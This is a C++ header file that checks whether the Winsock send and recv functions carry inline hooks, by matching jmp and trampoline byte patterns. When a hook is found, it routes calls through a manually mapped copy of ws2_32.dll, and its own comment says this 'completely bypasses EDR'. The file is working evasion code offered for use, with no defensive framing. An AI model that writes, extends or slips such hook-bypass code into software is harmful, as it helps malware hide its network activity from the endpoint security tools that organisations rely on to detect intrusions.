#pragma once
#include <windows.h>
#include <winternl.h>
#include "manual_map.h"

namespace syscall_direct {

// Syscall structures
typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID Pointer;
    };
    ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

// Inline hook detection
inline bool is_function_hooked(void* func_addr) {
    auto bytes = static_cast<uint8_t*>(func_addr);

    // Check for common hook patterns
    // JMP relative (E9)
    if (bytes[0] == 0xE9) return true;

    // JMP indirect (FF 25)
    if (bytes[0] == 0xFF && bytes[1] == 0x25) return true;

    // PUSH + RET trampoline
    if (bytes[0] == 0x68 && bytes[5] == 0xC3) return true;

    // MOV RAX, addr + JMP RAX (48 B8 ... FF E0)
    if (bytes[0] == 0x48 && bytes[1] == 0xB8 && bytes[10] == 0xFF && bytes[11] == 0xE0) return true;

    return false;
}

// Safe recv using manual mapping to bypass hooks
inline int recv_safe(SOCKET s, char* buf, int len, int flags) {
    // Check if recv is hooked
    auto recv_ptr = reinterpret_cast<void*>(&recv);
    bool hooked = is_function_hooked(recv_ptr);

    if (!hooked) {
        // Use normal recv if not hooked
        return recv(s, buf, len, flags);
    }

    // If hooked, use manually mapped ws2_32.dll (completely bypasses EDR)
    using recv_t = int (WINAPI*)(SOCKET, char*, int, int);
    auto clean_recv = manual_map::get_ws2_function<recv_t>("recv");

    if (!clean_recv) {
        // Fallback to normal recv if manual mapping fails
        return recv(s, buf, len, flags);
    }

    return clean_recv(s, buf, len, flags);
}

// Safe send using manual mapping
inline int send_safe(SOCKET s, const char* buf, int len, int flags) {
    auto send_ptr = reinterpret_cast<void*>(&send);
    bool hooked = is_function_hooked(send_ptr);

    if (!hooked) {
        return send(s, buf, len, flags);
    }

    // Use manually mapped ws2_32.dll
    using send_t = int (WINAPI*)(SOCKET, const char*, int, int);
    auto clean_send = manual_map::get_ws2_function<send_t>("send");

    if (!clean_send) {
        return send(s, buf, len, flags);
    }

    return clean_send(s, buf, len, flags);
}

} // namespace syscall_direct
